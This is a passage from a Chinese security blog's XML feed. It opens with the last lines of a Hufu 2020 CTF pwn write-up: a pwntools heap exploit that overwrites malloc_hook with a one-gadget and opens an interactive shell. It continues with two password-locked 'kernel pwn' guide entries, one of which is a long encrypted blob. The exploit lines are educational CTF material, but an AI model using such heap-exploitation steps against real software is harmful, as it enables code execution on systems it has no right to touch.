class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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